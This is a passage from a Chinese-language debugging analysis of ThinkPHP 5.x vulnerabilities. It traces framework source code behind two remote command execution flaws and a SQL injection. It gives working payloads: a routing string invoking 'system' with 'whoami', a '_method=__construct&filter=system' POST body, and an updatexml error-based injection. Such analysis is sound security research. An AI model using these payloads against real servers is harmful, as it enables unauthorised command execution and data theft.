                // 自动搜索控制器
                // 不执行，省略了
            } else {
                // 解析控制器
                $controller = !empty($path) ? array_shift($path) : null;
            }
            // 解析操作
            $action = !empty($path) ? array_shift($path) : null;
            // 解析额外参数
            self::parseUrlParams(empty($path) ? '' : implode('|', $path));
            // 封装路由
            $route = [$module, $controller, $action];
            // 检查地址是否被定义过路由
            $name  = strtolower($module . '/' . Loader::parseName($controller, 1) . '/' . $action);
            $name2 = '';
            if (empty($module) || isset($bind) && $module == $bind) {
                $name2 = strtolower(Loader::parseName($controller, 1) . '/' . $action);
            }
            if (isset(self::$rules['name'][$name]) || isset(self::$rules['name'][$name2])) {
                throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
            }
        }
        return ['type' => 'module', 'module' => $route];
    }
回到了最开始的 `run()` ，往下执行到 `$data = self::exec($dispatch, $config);`，`$dispatch`
就是上面我们返回的 `['type' => 'module', 'module' => $route]`。执行如下代码。
    case 'module': // 模块/控制器/操作
        $data = self::module(
            $dispatch['module'],
            $config,
            isset($dispatch['convert']) ? $dispatch['convert'] : null
        );
        break;
最后在 `module()` 的最后 `return self::invokeMethod($call, $vars);`，这里的 `$call`
就是我们传入的控制器、操作。
在这生成反射实例，然后在 `bindParams` 获取了我们传入的参数
`function=call_user_func_array&vars[0]=system&vars[1][]=whoami`
    public static function invokeMethod($method, $vars = [])
    {
        if (is_array($method)) {
            $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
            $reflect = new \ReflectionMethod($class, $method[1]);
        } else {
            // 静态方法
            $reflect = new \ReflectionMethod($method);
        }
        $args = self::bindParams($reflect, $vars);
        self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');
        return $reflect->invokeArgs(isset($class) ? $class : null, $args);
    }
最后就到达了我们的目的地 `invokeFunction()`，成功rce。
    public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);
        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');
        return $reflect->invokeArgs($args);
    }
## 0x02 ThinkPHP v5.0 命令执行
###  0x00 影响范围
> ThinkPHP 5.0.0 ~ ThinkPHP 5.0.23
###  0x01 演示版本
ThinkPHP v5.0.15  
PHP: php 7.3.4  
OS：Windows10
###  0x02 漏洞复现
向网页进行POST传参 `_method=__construct&filter=system&a=whoami` ，可以发现成功执行命令。
###  0x03 触发条件
`Application/config.php` 开启调试。
    // 应用调试模式
    'app_debug' => true,
###  0x04 调试分析
由于漏洞出现在参数过滤处，所以我们在 `Think\App.php` 的 `run()` 函数里打下断点
    $request->filter($config['default_filter']);
这里获取了全局过滤方法，默认为空字符。
    // 默认全局过滤方法 用逗号分隔多个
    'default_filter'         => '',
跟进 `filter()` ，这里传入的 `$filter` 不为null，所以进入else。
    /**
     * 设置或获取当前的过滤规则
     * @param mixed $filter 过滤规则
     * @return mixed
     */
    public function filter($filter = null)
    {
        if (is_null($filter)) {
            return $this->filter;
        } else {
            $this->filter = $filter;
        }
    }
随后 `run()` 函数执行到 `routeCheck()`。
    if (empty($dispatch)) {
        $dispatch = self::routeCheck($request, $config);
    }
在 `routeCheck()` 中调用了 `check()` ，又接着调用了 `method()`。
获取 `config.php` 中的 `var_method`，默认为
`_method`，由于我们传入了`_method=__construct`，这里进入elseif，就使得
`$this->method=__construct`，随后就调用了 `__construct()`，将我们POST传递的参数当做函数参数传入。
    public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        } elseif (!$this->method) {
            if (isset($_POST[Config::get('var_method')])) {
                $this->method = strtoupper($_POST[Config::get('var_method')]);
                $this->{$this->method}($_POST);
            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            } else {
                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
            }
        }
        return $this->method;
    }
这里对传入的参数进行了遍历，由于 `Request` 类存在 `filter` 属性，所以就将我们的输入覆盖了原来的 `filter` 。
    protected function __construct($options = [])
    {
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }
        // 保存 php://input
        $this->input = file_get_contents('php://input');
    }
又回到 `run()` ，这里会判断是否开启了debug，开启的话就会调用 `$request->param()` ，来记录参数信息。
    // 记录路由和请求信息
    if (self::$debug) {
        Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
        Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
        Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
    }
调用 `$this->post` 来获取传递的参数，然后进入 `input()`。
    public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->param)) {
            $method = $this->method(true);
            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }
            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->get(false), $vars, $this->route(false));
        }
        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;
            return $this->input($data, '', $default, $filter);
        }
        return $this->input($this->param, $name, $default, $filter);
    }
随后执行 `$filter = $this->getFilter($filter, $default);` 调用 `$this->getFilter`
来解析获取过滤器，也就是我们之前覆盖为了 `system` 的 `filter`。
进入 `filterValue()` ，调用了 `$value = call_user_func($filter, $value);` ，`$filter`
就是 `system` ，`$value` 就是我们传入的参数的值，成功执行命令。
    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }
        return $this->filterExp($value);
    }
## 0x03 ThinkPHP v5.0.15 SQL注入
###  0x00 影响范围
> ThinkPHP 5.0.13-5.0.15
###  0x01 演示版本
ThinkPHP v5.0.15  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
`?username[0]=inc&username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&username[2]=1`
###  0x03 触发条件
报错注入需要开启debug模式
    // 应用调试模式
    'app_debug' => true,
添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。
    public function sql()
    {
        $username = request()->get('username/a');
        db('user')->insert(['username' => $username,'password'=>'password']);
        return 'Update success';
    }
###  0x04 调试分析
首先进入 `insert()` 函数，然后调用 `$sql = $this->builder->insert($data, $options,
$replace);` 来生成SQL语句。随后调用 `$this->parseData()` ，漏洞就出现在这。
    // 分析并处理数据
    $data = $this->parseData($data, $options);
先获取了表的字段名，然后逐个对要插入的数据进行判断，这里就是关键了，如果我们传入的不是数组，而是一个字符串的话，就会进入 `elseif
(is_scalar($val))`，如果传入的是数组的话就进入的是 `elseif (is_array($val) && !empty($val))`。
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }
        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }
        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);
            if (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                if (0 === strpos($val, ':') && $this->query->isBind(substr($val, 1))) {
                    $result[$item] = $val;
                } else {
                    $key = str_replace('.', '_', $key);
                    $this->query->bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);
                    $result[$item] = ':data__' . $key;
                }
            }
        }
        return $result;
    }
先来看看传入字符串的时候，该函数会返回一个数组，不会将字符串直接插入，我们接着往下看。
    `username`:":data__username"
    `password`:":data__password"
回到 `insert()`，我们拿到了一个初始的SQL语句 `"INSERT INTO `user` (`username` , `password`)
VALUES (:data__username , :data__password) "`
调用 `$result = 0 === $sql ? 0 : $this->execute($sql, $bind);`，调试跟进，又接着调用
`$this->connection->execute($sql, $bind);`。
然后通过以下语句进行参数绑定，然后执行语句，使用的是PDO预编译，肯定是无法进行注入的。
    // 预处理
    if (empty($this->PDOStatement)) {
        $this->PDOStatement = $this->linkID->prepare($sql);
    }